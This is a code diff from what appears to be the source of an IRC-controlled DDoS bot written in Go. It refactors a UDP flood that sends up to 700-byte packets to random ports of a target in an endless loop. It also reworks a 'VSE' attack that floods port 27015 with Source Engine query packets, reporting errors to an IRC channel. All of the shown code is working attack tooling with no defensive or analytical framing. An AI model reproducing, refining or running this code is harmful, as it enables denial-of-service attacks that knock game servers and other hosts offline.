@@ -64,12 +64,7 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 
 func udp_portSet(port string) string { return port }
 
-func udp_packetCraft(udpTarget, size, set_chan, port string, reportIRC net.Conn) {
-	_size, _ := strconv.Atoi(size)
-	if _size <= 0 || _size > 700 {
-		_size = 700
-	}
-	buffer := make([]byte, _size)
+func udp_packetCraft(udpTarget, set_chan, port string, buffer []byte, reportIRC net.Conn) {
 	udp, err := net.Dial("udp", udpTarget+":"+port)
 	if err != nil {
 		IRC_Report(reportIRC, set_chan, err.Error())
@@ -80,16 +75,22 @@ func udp_packetCraft(udpTarget, size, set_chan, port string, reportIRC net.Conn)
 
 func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 	for {
-		udp_packetCraft(udpTarget, size, set_chan, udp_portSet(fmt.Sprint(rand.Intn(65535))), reportIRC)
+		_size, _ := strconv.Atoi(size)
+		if _size <= 0 || _size > 700 {
+			_size = 700
+		}
+		dudpbuff := make([]byte, _size)
+		udp_packetCraft(udpTarget, set_chan, udp_portSet(fmt.Sprint(rand.Intn(65535))), dudpbuff, reportIRC)
 		if DDoS_Switch {
 			break
 		}
 	}
 }
 
-func VSE(vseTarget, size, set_chan string, reportIRC net.Conn) {
+func VSE(vseTarget, set_chan string, reportIRC net.Conn) {
 	for {
-		udp_packetCraft(vseTarget, size, set_chan, udp_portSet("27015"), reportIRC)
+		vsebuff := []byte("TSource Engine Query")
+		udp_packetCraft(vseTarget, set_chan, udp_portSet("27015"), vsebuff, reportIRC)
 		if DDoS_Switch {
 			break
 		}
